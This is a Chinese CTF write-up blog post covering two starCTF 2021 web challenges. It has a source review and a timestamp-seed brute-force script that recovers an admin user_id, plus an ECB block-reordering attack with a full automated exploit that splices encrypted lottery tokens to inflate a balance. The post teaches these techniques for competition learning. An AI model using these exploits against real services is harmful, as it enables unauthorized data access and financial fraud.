---
title: starCTF 2021 复现
date: 2021-01-19
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210228100314.jpeg
description: 复旦大学******战队举办的比赛
categories: 
- ctf_writeup
tags:
- 时间戳爆破
- WebCrypto
---
### oh-my-note

考点：时间戳爆破

#### 题目分析

先给了源码：[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/XCTF-starCTF2021/%5BstarCTF2021%5Doh-my-note.zip)

![image-20210118212334753](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210119144005.png)

题目是一个留言板，发布留言的时候输入用户名可以选择为公开或者私有

#### 代码审计

打开源码，审计；

在`create_note()`函数中，如果用户不存在，就会自动创建

```python
@app.route('/create_note', methods=['GET', 'POST'])
def create_note():
    try:
        form = CreateNoteForm()
        if request.method == "POST":
            username = form.username.data
            title = form.title.data
            text = form.body.data
            prv = str(form.private.data)
            user = User.query.filter_by(username=username).first()

            if user:
                user_id = user.user_id
            else:
                timestamp = round(time.time(), 4)
                random.seed(timestamp)
                user_id = get_random_id()
                user = User(username=username, user_id=user_id)
                db.session.add(user)
                db.session.commit()
                session['username'] = username

            timestamp = round(time.time(), 4)

            post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
            #获取小数点后四位UNIX时间戳对应的Y-M-d H-M时间
            random.seed(user_id + post_at)
            note_id = get_random_id()

            note = Note(user_id=user_id, note_id=note_id,
                        title=title, text=text,
                        prv=prv, post_at=post_at)
            db.session.add(note)
            db.session.commit()
            return redirect(url_for('index'))

        else:
            return render_template("create.html", form=form)
    except Exception as e:
        pass

```

其中，我们`post_at`已经知道

![image-20210119142946848](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210119144023.png)

那么在下面这张图里，我们只有`user_id`不知道

![image-20210119142616697](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210119144031.png)

而my_note()的else里面只需要`user_id`就可以列出所有私有note

```python
@app.route('/my_notes')
def my_notes():
    if session.get('username'):
        username = session['username']
        user_id = User.query.filter_by(username=username).first().user_id
    else:
        user_id = request.args.get('user_id')
        if not user_id:
            return redirect(url_for('index'))

    results = Note.query.filter_by(user_id=user_id).limit(100).all()
    notes = []
    for x in results:
        note = {}
        note['title'] = x.title
        note['note_id'] = x.note_id
        notes.append(note)

    return render_template("my_notes.html", notes=notes)
```

于是我们可以根据已知的`note_id`和`post_at`来~~反推~~爆破`user_id`，只要算出admin的id即可看到发布的私有flag。

因为时间戳精确到了小数点后四位，我们知道的`post_at`是分钟级别的，所以这里需要爆破最多`10000*60`次

```python
import random
import datetime
import time
import string

def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])

post_at = '2021-01-15 02:29 UTC'#admin发布的第一个Pubic note时间

l = [i/10000 for i in range(0, 10000)]#小数部分，l是一个列表
for j in range(0,60):
    ta1 = time.strptime('2021-01-15 10:29:{} UTC'.format(j), '%Y-%m-%d %H:%M:%S UTC')#格式化时间，因为时区不同需要加8小时    
    ta = int(time.mktime(ta1))#转换为时间戳
    for i in l:
        t = ta + i#整数部分与小数部分拼接
        random.seed(t)
        u_id = get_random_id()

        random.seed(u_id + post_at)
        p_id = get_random_id()
        if p_id == 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u':#admin发布的第一个Pubic note
            print(u_id)
            #算出来admind的userid是7bdeij4oiafjdypqyrl2znwk7w9lulgn
        
        if(i*10000 % 8999 == 0):
            print(i, t)
```

有一个坑，因为时区原因，从获得的时间反推时间戳的时候需要加8个小时

![image-20210119143535541](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210119144048.png)

*ctf{Y0u_Are_t3e_Master_of_3he_Time!}



### lottery again

考点：EBC重排攻击，json_decode

#### 题目分析

题目首先给了源码：[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/XCTF-starCTF2021/%5BstarCTF2021%5Dlottery%20again.zip)

![image-20210118172658033](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210119144055.png)

网站的功能是注册，登陆，buy lottery，每一个用户初始只有300，买一次彩票花100，获得金额是1~100，然而flag需要9999。

打开源码，审计，主要功能在Http/Controller/LotteryController.php

![image-20210118184827067](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210119144108.png)

同时结合抓到的数据包，我们得知运作方式是：

```
function buy()(生成一单lottery，返回对称加密后的enc)->
function info()(客户端发送enc，服务端对称解密并且jsondecode，返回这单lottery的信息)->
function charge()(接收客户端的enc，对称解密并且jsondecode，根据解密得到的user uuid找到用户信息，根据lottery uuid找到lottery信息，把lottery的钱加到user账户)
```

在`function buy()`里面有这么几行代码：

```php
$lottery = Lottery::create(['coin' => 100 - floor(sqrt(random_int(1, 10000)))]);
$serilized = json_encode([
    'lottery' => $lottery->uuid,
    'user' => $user->uuid,
    'coin' => $lottery->coin,
]);
$enc = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, env('LOTTERY_KEY'), $serilized, MCRYPT_MODE_ECB));
```

我们可以看到他使用了EBC模式和`rijndael256`来对`enc`进行加密；

#### EBC加密模式

![http://p3.qhimg.com/t01b53d433f418eb7da.png](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210119144116.png)



> ECB模式是所有模式中最简单的一种。明文分组和密文分组是一一对应的，如果明文分组有相同的那么最后的密文中也会有相同的密文分组。
>
> 因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转）



 #### ECB块重排攻击

前文说过，在块加密中ECB模式中每个块都是独立加密的。因此攻击者可以在未知密钥的情况下，对密文中的块进行重新排列，组合成合法的可解密的新密文。

举一个例子，某CMS的cookie格式为DES-ECB加密后的数据，而明文格式如下：

```
admin=0;username=pan
```

由于DES使用的块大小是8字节，因此上述明文可以切分成三个块，其中`@`为填充符号：

```
admin=0;
username
=pan@@@@
```

假设我们可以控制自己的用户名（在注册时），那么有什么办法可以在不知道密钥的情况下将自己提取为管理员呢（即admin=1）？首先将用户名设置为`pan@@@@admin=1;`，此时明文块的内容如下：

```
admin=0;username=pan@@@@admin=1;
```

我们所需要做的，就是在加密完成后，将服务器返回的cookie使用最后一个块替换第一个块，这样一来就获得了一个具有管理员权限的合法cookie了。

#### 回到题目

请求`/lottery/buy`路由的时候，由于使用的是EBC模式的加密，每一块密文直接与明文对应

而请求`/lottery/charge`的时候服务端直接解密我们传过去的enc，根据lottery的uuid和user的uuid来把lottery的金额加入账户余额。

利用这一点我们便可以注册多个账户，生成多个lottery的uuid并且通过把lottery的uuid拼接到请求`/lottery/charge`时的enc，来让多个lottery的金额存到同一个user，刷钱。

本题使用的是`MCRYPT_RIJNDAEL_256`加密，`rijndael128`与`aes`相同，都是以128位为一个块加密，`rijndael256`则是以256位为一个块，即32字节。

对于一个enc而言：

```json
{"lottery":"bb9c4db6-d339-4a26-9|397-caeb4bfe043e","user":"157b58|a1-108b-47cc-abf4-fff1f903b05d",|"coin":6}@@@@@@@@@@@@@@@@@@@@@@@
//@是填充
```

可以看到无论我们替换哪一块，都没有办法完全控制user或者lottery，但是我们可以把第一单lottery的1，2块加上第二单lottery的2，3，4块，构成类似于下面的payload：

```json
{"lottery":"1287901b-89d7-4b94-a|0d7-a7655d85800d","user":"157b58|397-caeb4bfe043e","user":"157b58|a1-108b-47cc-abf4-fff1f903b05d",|"coin":6}@@@@@@@@@@@@@@@@@@@@@@@
```

前面的user在json_decode之后会被后面的user所覆盖，形成了user不变而lottery任意控制的局面

贴一个JrXnm师傅的exp：

```python
import requests
import random
import string
import json
import base64
from urllib.parse import quote

user_token = "Yu5PGq2I0jhZssXttlEaiBkNQXRrxzbD"
user_uuid = "ae4774be-2e44-49d2-82dc-6c69c57c4378"
user_enc = b"+Zza7U18mMFaHhYyrTaOr\/IubODmR8QF1yC01+0XIg3Ea0s5evdcMwcHHNovcM3pytuj4wsD2NFsMv1g+yjXfyEFlnH5hTkHnLKzkFc0dmHqydlPZNnijH8cHjiFVPKU4tKa3tbXh1v0ZTejYwnrwjeWiY89xrpsXSMn2CEt8bM="

cookie = {
    "api_token": user_token
}

url = "http://52.149.144.45:8080"

def get_random():
    return ''.join(random.sample(string.ascii_letters + string.digits, 10))

def register():
    username=get_random()
    data= {
            "username": username,
            "password": "asdasd"
    }
    res = requests.post(url + "/user/register",data=data)
    d = json.loads(res.text)
    
    return username

def login(username, password="asdasd"):
    data = {
        "username": username,
        "password": password
    }
    res = requests.post(url + "/user/login",data=data)
    d = json.loads(res.text)
    return d['user']['api_token']

def info(api_token):
    res = requests.get(url + "/user/info?api_token=" + api_token)
    d = json.loads(res.text)
    print('uuid: '+d['user']['uuid'])

def buy(api_key):
    data = {
        "api_token": api_key
    }
    res = requests.post(url + "/lottery/buy",data=data)
    #print(res.text)
    d = json.loads(res.text)

    return d['enc']

def get_enc(enc):
    o = base64.b64decode(enc)
    u = base64.b64decode(user_enc)
    m = base64.b64encode(o[:64] + u[32:])
    print('enc: ', end='')
    print(quote(m))
    return m

def charge(enc):
    data = {
        "user": user_uuid,
        "enc": enc,
        "coin": "7"
    }
    res = requests.post(url + "/lottery/charge", data=data, cookies=cookie)
    print("charge: ", end='')
    print(res.content)

if __name__ == "__main__":
    while True:
        try:
            username = register()
            api_token = login(username)
            enc = buy(api_token)
            info(api_token)
            mo_enc = get_enc(enc)
            charge(mo_enc)
        except:
            pass
```

JrXnm师傅tql，膜

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210119144130.png)



### oh-my-bet

考点：



参考：

>[*CTF Writeup by 星盟](https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247485857&idx=1&sn=1cf534df42999d5126fc3cf3b7fc8f9b&chksm=fd711cecca0695faf313845fb30671cd61feee2a62ad9b13f213d4de7a5b64c0dfbb6d2ac31f&mpshare=1&scene=23&srcid=0119de31ZoFyjJWQIqWvKnuh&sharer_sharetime=1611032814136&sharer_shareid=8b035134b7fe8a8160582bb9a2551229#rd)
>
>[对称加密与攻击案例分析](https://bbs.pediy.com/thread-259355.htm)